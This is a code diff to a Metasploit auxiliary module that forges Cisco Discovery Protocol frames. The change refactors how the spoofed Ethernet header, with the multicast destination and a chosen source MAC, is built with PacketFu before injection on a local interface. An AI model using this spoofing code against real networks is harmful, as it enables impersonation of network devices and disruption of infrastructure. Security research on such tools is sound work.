@@ -71,21 +71,13 @@ class Metasploit3 < Msf::Auxiliary
   def do_spoof
     print_status("Sending CDP message on #{interface}")
     p = prep_cdp                                              # Preparation of the CDP content
-    dst_mac = "\x01\x00\x0C\xCC\xCC\xCC"                      # CDP multicast
-
-    # Source Mac Address Preparation
-    src_mac = mac_to_bytes(smac)
 
     # Injecting packet to the network
     l = PacketFu::Inject.new(iface: interface)
     cdp_length = ["%04X" % (p.length + 8).to_s].pack('H*')
-    dot3 = dst_mac + src_mac + cdp_length
+    dot3 =  PacketFu::EthHeader.mac2str("01:00:0C:CC:CC:CC") + PacketFu::EthHeader.mac2str(smac) + cdp_length
     llc = "\xAA\xAA\x03\x00\x00\x0c\x20\x00"
     l.array_to_wire(array: [dot3 + llc + p])
-  end
-
-  def mac_to_bytes(mac)
-    [mac.gsub(':', '')].pack('H*')
   end
 
   def prep_cdp
